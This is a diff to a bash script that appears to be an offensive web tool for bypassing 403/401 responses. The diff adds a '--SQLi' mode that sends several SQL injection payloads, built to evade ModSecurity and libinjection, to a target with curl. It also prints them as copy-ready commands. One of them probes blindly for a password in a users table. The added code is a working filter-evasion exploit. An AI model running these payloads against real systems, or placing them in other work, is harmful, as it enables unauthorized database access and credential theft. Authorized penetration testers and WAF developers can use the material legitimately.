@@ -40,6 +40,7 @@ function usage(){
 		printf "\t--port\t\t\t\tPort Bypass\n">&2
 		printf "\t--HTTPmethod\t\t\tHTTP Method Bypass\n">&2
 		printf "\t--encode\t\t\tURL Encode Bypass\n">&2
+		printf "\t--SQLi\t\t\t\tMod_Security & libinjection Bypass\n">&2
 		printf '\n' >&2
 		printf "ALL BYPASSES\n">&2
 		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
@@ -1475,6 +1476,31 @@ function URL_Encode_Bypass(){
 	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/;${path}/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
 	print
 }
+function SQLi_libinjection(){
+	echo -e ${blue}"---------------------------------------"${end}
+	echo -e ${cyan}"[+] Mod_Security & libinjection Bypass "${end}
+	echo -e ${blue}"---------------------------------------"${end}
+	
+	echo -n "Payload [ ' or 1.e(\")=' ]:"
+	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/'%20or%201.e(%22)%3D'" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
+	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/'%%%%20or%%%%201.e(%%%%22)%%%%3D' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
+	print
+
+	echo -n "Payload [ 1.e(ascii ]:"
+	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(ascii" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
+	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/1.e(ascii' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
+	print
+
+	echo -n "Payload [ 1.e(substring( ]:"
+	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(substring(" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
+	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/1.e(substring(' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
+	print
+
+	echo -n "Payload [ 1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2 ]:"
+	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(ascii%201.e(substring(1.e(select%20password%20from%20users%20limit%201%201.e%2C1%201.e)%201.e%2C1%201.e%2C1%201.e)1.e)1.e)%20%3D%2070%20or'1'%3D'2'" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
+	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/1.e(ascii%%%%201.e(substring(1.e(select%%%%20password%%%%20from%%%%20users%%%%20limit%%%%201%%%%201.e%%%%2C1%%%%201.e)%%%%201.e%%%%2C1%%%%201.e%%%%2C1%%%%201.e)1.e)1.e)%%%%20%%%%3D%%%%2070%%%%20or'1'%%%%3D'2' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
+	print
+}
 function 403bypass(){ 
 	Header_Bypass
 	Protocol_Bypass
@@ -1510,6 +1536,9 @@ function prg(){
 				;;
 			'--exploit')
 				mode='exploit'
+				;;
+			'--SQLi')
+				mode='sqli'
 				;;
 			'-h'|'--help')
 					usage
@@ -1564,6 +1593,11 @@ function prg(){
 			banner
         	URL_Encode_Bypass
         	exit 0
+	elif [ "${mode}" == 'sqli' ];then
+			echo "SQLi"
+			banner
+			SQLi_libinjection
+			exit 0 
 	elif [ "${mode}" == 'exploit' ];then
 			echo "exploit"
         	banner
